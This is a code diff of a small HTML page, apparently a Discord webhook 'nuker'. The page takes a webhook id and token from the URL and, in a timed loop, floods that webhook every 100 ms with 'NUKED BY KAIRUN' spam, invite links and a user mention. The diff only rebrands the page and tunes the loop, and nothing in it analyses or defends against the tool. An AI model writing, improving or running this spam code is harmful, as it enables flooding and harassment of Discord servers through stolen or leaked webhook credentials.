@@ -8,20 +8,20 @@
 </head>
 
 <body>
-    <h1>Alizq on top!!</h1>
+    <h1>NUKED BY KAIRUN EZ</h1>
     <script>
+        let param = new URLSearchParams(window.location.search);
         setInterval(() => {
-              let param = new URLSearchParams(window.location.search);
                fetch("https://discord.com/api/webhooks/"+param.get("id")+"/"+param.get("token"), {
                     method: "POST",
                     body: JSON.stringify({
-                    content: "https://kairun.rasky1.com\nNUKED BY KAIRUN!!\n\"https://kairun.jp/DC\"\nhttps://discord.com/invite/J2KvdDxMpj"
+                    content: "https://kairun.rasky1.com\nNUKED BY KAIRUN!!\nhttps://kairun.jp/DC\n\"https://discord.gg/TwQpmmgJ7k\"\n\"https://discord.gg/abj\"\n<@949479338275913799>"
                     }),
                     headers: {
                         "Content-Type": "application/json"
                     }
                 })
-        }, 1);
+        }, 100);
     </script>
 </body>
 
